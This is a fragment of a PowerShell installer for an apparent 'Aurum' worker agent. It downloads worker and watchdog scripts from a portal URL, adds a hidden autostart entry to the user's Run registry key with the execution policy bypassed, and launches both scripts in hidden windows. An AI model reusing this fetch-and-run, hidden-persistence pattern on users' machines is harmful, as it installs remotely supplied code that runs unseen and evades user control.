...
$watchdogPath=Join-Path $Root 'worker-watchdog.ps1'
Invoke-WebRequest -UseBasicParsing -Uri "$Portal/worker.ps1" -OutFile $workerPath
Invoke-WebRequest -UseBasicParsing -Uri "$Portal/worker-watchdog.ps1" -OutFile $watchdogPath

$runKey='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
New-Item -Path $runKey -Force | Out-Null
$watchdogCmd='powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $watchdogPath
Set-ItemProperty -Path $runKey -Name 'AurumWorkerWatchdog' -Value $watchdogCmd
Remove-ItemProperty -Path $runKey -Name 'AurumWorker' -ErrorAction SilentlyContinue

$workerExisting=@(Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue | Where-Object {$_.CommandLine -like "*$workerPath*"})
if($workerExisting.Count -eq 0){Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$workerPath)}
$watchdogExisting=@(Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue | Where-Object {$_.CommandLine -like "*$watchdogPath*"})
if($watchdogExisting.Count -eq 0){Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$watchdogPath)}
...
Write-Host "Watchdog: installed and started"
